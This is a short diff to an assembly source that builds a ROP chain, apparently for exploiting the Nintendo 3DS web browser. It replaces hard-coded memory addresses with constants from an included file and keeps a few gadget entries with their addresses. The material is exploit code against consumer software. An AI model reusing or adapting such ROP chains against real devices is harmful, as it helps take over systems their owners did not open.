@@ -1,10 +1,8 @@
 .nds
 
-.create "spider_initial_rop.bin",0x0
+.include "../../build/constants.s"
 
-THREAD0ROPLOCATION equ 0x09A69000
-RO_HANDLELOC equ 0x003D8FDC
-FS_HANDLELOC equ 0x003D9680
+.create "spider_initial_rop.bin",0x0
 
 .orga 0x0
 	.word 0xDEADC0DE
@@ -29,7 +27,7 @@ FS_HANDLELOC equ 0x003D9680
 			.word 0x0FFFFF10 ; r4
 
 		.word 0x0010c2fc ; pop {r0, pc}
-			.word THREAD0ROPLOCATION ; r0
+			.word SPIDER_THREAD0ROP_ADR ; r0
 		.word 0x00109d04 ; str r0, [r4] | pop {r4, pc}
 			.word 0x0FFFFF14 ; r4
 
